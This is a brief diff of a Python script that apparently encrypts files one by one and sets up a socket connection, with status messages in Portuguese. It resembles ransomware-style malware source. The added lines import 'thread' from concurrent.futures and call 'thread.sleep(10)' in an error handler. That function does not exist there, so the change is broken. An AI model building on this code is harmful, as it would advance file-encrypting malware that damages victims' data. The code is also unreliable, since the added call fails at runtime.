@@ -1,3 +1,4 @@
+from concurrent.futures import thread
 import socket
 import os
 import threading
@@ -29,6 +30,7 @@ def encrypt(key):
             print(f'{file} encriptacao completa')
         except:
             print('falhou em encriptar')
+            thread.sleep(10)
         q.task_done()
 
 #informação de conexao        
